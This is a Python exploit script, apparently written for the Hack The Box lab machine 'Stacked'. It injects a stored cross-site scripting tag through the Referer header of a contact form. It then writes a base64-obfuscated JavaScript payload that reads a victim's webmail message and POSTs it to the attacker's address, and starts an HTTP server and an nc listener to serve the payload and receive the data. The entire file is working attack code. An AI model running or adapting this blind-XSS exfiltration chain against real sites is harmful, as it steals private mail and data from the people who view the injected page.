import urllib3
import sys
import requests
import base64
import subprocess

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.Session()

url = 'http://portfolio.stacked.htb/process.php'

header = {'Referer':'<script src="http://10.10.14.2/payload.js"></script>'}

data = {
    'fullname':'test',
    'email':'test@test.com',
    'tel':'012345678901',
    'subject':'test',
    'message':'test'
    }

session.post(url, verify=False, proxies=proxies, data=data, headers=header)

xssFile = "dmFyIHRhcmdldCA9ICJodHRwOi8vbWFpbC5zdGFja2VkLmh0Yi9yZWFkLW1haWwucGhwP2lkPTEiOyB2YXIgcmVxMSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyByZXExLm9wZW4oIkdFVCIsIHRhcmdldCwgZmFsc2UpOyByZXExLnNlbmQoKTsgdmFyIHJlc3BvbnNlID0gcmVxMS5yZXNwb25zZVRleHQ7IHZhciByZXEyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7IHJlcTIub3BlbigiUE9TVCIsICJodHRwOi8vMTAuMTAuMTQuMjo5MDAxLyIsIGZhbHNlKTsgcmVxMi5zZW5kKHJlc3BvbnNlKTs="

content = base64.b64decode(xssFile)

f = open("payload.js", "w")
f.write(content.decode())
f.close()

pythonServer = subprocess.Popen(["python","-m","http.server", "80"])

ncListener = subprocess.Popen(["nc","-nvlp","9001"])

pythonServer.wait()
ncListener.wait()